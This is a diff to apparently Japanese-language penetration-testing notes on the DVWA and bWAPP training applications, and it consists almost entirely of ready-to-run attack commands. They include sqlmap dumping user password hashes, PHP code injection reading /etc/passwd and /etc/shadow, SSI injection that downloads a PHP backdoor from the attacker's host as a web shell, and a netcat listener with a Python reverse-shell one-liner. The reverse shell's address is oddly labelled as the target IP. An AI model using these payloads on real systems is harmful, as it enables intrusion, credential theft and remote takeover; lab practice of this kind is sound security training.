@@ -576,3 +576,55 @@ sqlmap -u "[target URL]" --cookie="PHPSESSID=gcubcshljo7pusb4dpkl3tn5i2; securit
 # パスワード解析
 sqlmap -u "[target URL]" --cookie="PHPSESSID=gcubcshljo7pusb4dpkl3tn5i2; security=low" -D dvwa -T users -C user,password --dump
 ```
+
+## bWAPP
+
+```bash
+wget https://download.vulnhub.com/bwapp/bee-box_v1.6.7z
+7za x ./bee-box_v1.6.7z
+```
+
+### PHP code インジェクション
+
+```txt
+# Linuxバージョン
+system('cat /proc/version');
+# ユーザ列挙
+system('cat /etc/passwd');
+# ユーザ名のみ
+system('cut -d: -f1 /etc/passwd');
+# パスワード表示（権限がないことが多い）
+system('cat /etc/shadow');
+# その他情報収集
+system('hostname');
+system('whoami');
+system('pwd');
+system('/sbin/ifconfig');
+```
+
+### Server-Side Includes (SSI) Injection
+
+```txt
+# 情報収集
+<!--#exec cmd="hostname" -->
+<!--#exec cmd="pwd" -->
+```
+
+```txt
+# リバースシェル
+# Webシェルを転送
+<!--#exec cmd="wget http://[ホストIP]:8050/php-backdoor.php.txt -O /var/www/bWAPP/web_shell.php" -->
+
+# http://[target IP]/bWAPP/web_shell.php にアクセス
+
+# ターミナルでリバースシェル
+nc -nlvp 4444
+
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("[target IP]",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl + z
+stty raw -echo
+fg
+reset
+```
